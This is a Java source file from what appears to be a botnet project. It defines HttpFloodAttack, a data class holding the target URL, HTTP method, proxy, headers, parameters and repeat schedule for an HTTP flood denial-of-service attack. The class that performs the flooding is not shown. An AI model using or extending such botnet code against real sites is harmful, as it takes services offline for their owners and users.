/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack.flooding;

import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.NonNull;
import lombok.ToString;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;

/**
 * The details of a HTTP Flood attack.
 * Used by {@link HttpFloodAttacker} to perform the attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
@Data
@EqualsAndHashCode(callSuper = true)
@ToString(callSuper = true)
public class HttpFloodAttack extends AbstractFloodAttack implements FloodAttack {

  protected static final Logger LOGGER = LogManager.getLogger(HttpFloodAttack.class);

  @NonNull
  private HttpMethod method;

  private Map<String,String> header = new HashMap<>();

  private Map<String,String> params = new HashMap<>();

  /**
   * Constructs a new attack with no proxy, no header nor parameters and single execution.
   * @param method the HTTP method.
   * @param target the target to attack.
   */
  public HttpFloodAttack(HttpMethod method, URL target) {
    this(method, target, HttpProxy.NONE, 1, null);
  }

  /**
   * Constructs a new attack with no header nor parameters and single execution.
   * @param target the target to attack.
   * @param proxy the proxy to attack through.
   */
  public HttpFloodAttack(HttpMethod method, URL target, HttpProxy proxy) {
    this(method, target, proxy, 1, null);
  }

  /**
   * Constructs a new attack with no proxy, no header nor parameters.
   * @param target the target to attack.
   * @param executions the number of executions.
   * @param period the period of executions.
   */
  public HttpFloodAttack(HttpMethod method, URL target,
                         int executions, Interval period) {
    super(target, HttpProxy.NONE, executions, period);
    this.method = method;
  }

  /**
   * Constructs a new attack with no header nor parameters.
   * @param target the target to attack.
   * @param proxy the HTTP proxy to execute the attack through.
   * @param executions the number of executions.
   * @param period the period of executions.
   */
  public HttpFloodAttack(HttpMethod method, URL target, HttpProxy proxy,
                         int executions, Interval period) {
    super(target, proxy, executions, period);
    this.method = method;
  }

  /**
   * Constructs a new attack with no proxy, empty properties and one execution.
   * @param target the target to attack.
   * @param proxy the HTTP proxy to execute the attack through.
   * @param header the request header.
   * @param executions the number of executions.
   * @param period the period of executions.
   */
  public HttpFloodAttack(HttpMethod method, URL target, HttpProxy proxy,
                         Map<String,String> header, Map<String,String> params,
                         int executions, Interval period) {
    super(target, proxy, executions, period);
    this.method = method;
    this.header = header;
    this.params = params;
  }
}
